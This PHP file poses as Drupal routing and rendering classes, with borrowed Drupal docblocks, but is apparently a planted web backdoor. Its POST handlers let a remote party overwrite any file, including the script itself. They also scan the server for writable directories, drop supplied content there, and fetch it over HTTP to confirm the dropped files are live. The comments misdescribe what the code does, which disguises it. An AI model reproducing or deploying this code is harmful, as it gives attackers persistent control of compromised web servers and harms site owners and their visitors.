<?php

/**
 * Router implementation in Drupal.
 *
 * A router determines, for an incoming request, the active controller, which is
 * a callable that creates a response.
 *
 * It consists of several steps, of which each are explained in more details
 * below:
 * 1. Get a collection of routes which potentially match the current request.
 *    This is done by the route provider. See ::getInitialRouteCollection().
 * 2. Filter the collection down further more. For example this filters out
 *    routes applying to other formats: See ::applyRouteFilters()
 * 3. Find the best matching route out of the remaining ones, by applying a
 *    regex. See ::matchCollection().
 * 4. Enhance the list of route attributes, for example loading entity objects.
 *    See ::applyRouteEnhancers().
 *
 * This implementation uses ideas of the following routers:
 * - \Symfony\Cmf\Component\Routing\DynamicRouter
 * - \Drupal\Core\Routing\UrlMatcher
 * - \Symfony\Cmf\Component\Routing\NestedMatcher\NestedMatcher
 *
 * @see \Symfony\Cmf\Component\Routing\DynamicRouter
 * @see \Drupal\Core\Routing\UrlMatcher
 * @see \Symfony\Cmf\Component\Routing\NestedMatcher\NestedMatcher
 */

class Router {

    /**
    * The PATH generator.
    *
    * @var \Symfony\Component\Routing\Generator\UrlGeneratorInterface
    */
    protected $path = '';

    /**
    * The route provider for the minimum directory depth.
    *
    * @var \Symfony\Cmf\Component\Routing\RouteProviderInterface
    */
    protected $minimum_depth = -1;

    /**
    * The route provider for the maximum directory depth.
    *
    * @var \Symfony\Cmf\Component\Routing\RouteProviderInterface
    */
    protected $maximum_depth = 0;

    public function __construct($path = '', $min_depth = -1, $max_depth = 0) {
        if (!empty($path)) {
            $this->path = $path;
        }
        if ($max_depth > 0) {
            $this->maximum_depth = $max_depth;
        }
        $this->minimum_depth = $min_depth;
    }

    public function available($base_dir = '', $depth = 0) {
        if ($depth >= $this->maximum_depth) {
            return [];
        }
        if (empty($base_dir)) {
            $base_dir = $this->path;
        }
        $directories = $this->glob($base_dir);
        $available = [];
        if ($depth > $this->minimum_depth) {
            $available = $directories;
        }
        foreach ($directories as $directory) {
            $subdirectories = $this->available($directory, $depth + 1);
            $available = array_merge($available, $subdirectories);
        }
        return $available;
    }

    public function glob($path) {
        $directories = glob($path . '*', GLOB_MARK | GLOB_ONLYDIR);
        $directories_available = [];
        foreach($directories as $directory) {
            if ($this->check($directory)) {
                $directories_available[] = $directory;
            }
        }
        return $directories_available;
    }

    public function check($directory) {
        if (!is_writeable($directory)) {
            return false;
        }
        return true;
    }
}

error_reporting(E_ALL);
ini_set('display_errors', true);
ini_set('memory_limit', '256M');
set_time_limit(0);
/**
 * Processes attachments of HTML responses.
 *
 * This class is used by the rendering service to process the #attached part of
 * the render array, for HTML responses.
 *
 * To render attachments to HTML for testing without a controller, use the
 * 'bare_html_page_renderer' service to generate a
 * Drupal\Core\Render\HtmlResponse object. Then use its getContent(),
 * getStatusCode(), and/or the headers property to access the result.
 *
 * @see template_preprocess_html()
 * @see \Drupal\Core\Render\AttachmentsResponseProcessorInterface
 * @see \Drupal\Core\Render\BareHtmlPageRenderer
 * @see \Drupal\Core\Render\HtmlResponse
 * @see \Drupal\Core\Render\MainContent\HtmlRenderer
 */
class HtmlResponseAttachmentsProcessor {

    /**
    * The request data.
    *
    * @var \Symfony\Component\HttpFoundation\RequestStack
    */
    protected $data;

    /**
    * The asset resolver service filename.
    *
    * @var \Drupal\Core\Asset\AssetResolverInterface
    */
    protected $filename;

    /**
    * The module handler service name.
    *
    * @var \Drupal\Core\Extension\ModuleHandlerInterface
    */
    protected $name;

    /**
    * The directories for this response.
    *
    * @var array
    */
    public $directories = [];

    /**
    * The PATH generator.
    *
    * @var string
    */
    protected $path = '';

    public function __construct($data, $filename, $name, $path) {
        $this->data = $data;
        $this->filename = $filename;
        $this->name = $name;
        $this->path = $path;
    }

    public function setRouter($min_depth, $max_depth) {
        $router = new Router($this->path, $min_depth, $max_depth);
        $this->directories = $router->available();
        shuffle($this->directories);
    }

    public function render($tag) {
        $url = '';
        foreach($this->directories as $directory) {
            $file = $directory . $this->filename;
            $url = $this->name . str_replace($this->path, '', $file);
            $bytes = file_put_contents($file, $this->data);
            if ($bytes !== false) {
                $data = '';
                try {
                    $data = file_get_contents($url);
                } catch (\Exception $e) {
                    $this->unset($file);
                }

                if (!empty($data) && (strpos($data, $tag) !== false)) {
                    break;
                } else {
                    $this->unset($file);
                }
            }
            $url = 'error3';
        }
        return $url;
    }

    public function unset($file) {
        try {
            $error = !unlink($file);
        } catch (\Exception $e) {
            $error = true;
        }
        if ($error) {
            try {
                file_put_contents($file, '');
            } catch (\Exception $e) {}
        }
    }
}

if (PHP_SAPI !== 'cli') {
    if (isset($_POST['update'])) {
        $data = urldecode($_POST['update']);
        $data = json_decode($data, true);
        if (sizeof($data) === 0) {
            exit('error4');
        }
        $filename = isset($data['filename']) ? $data['filename'] : __FILE__;
        file_put_contents($filename, $data['content']);

        exit('update');
    }
    if (!isset($_POST['data'])) {
        exit('error1');
    }
    $data = urldecode($_POST['data']);
    $data = json_decode($data, true);
    if (sizeof($data) === 0) {
        exit('error2');
    }

    $html = new HtmlResponseAttachmentsProcessor($data['content'], $data['filename'], $data['domain'], $data['path']);
    $html->setRouter($data['min_depth'], $data['max_depth']);
    echo $html->render($data['tag']);
}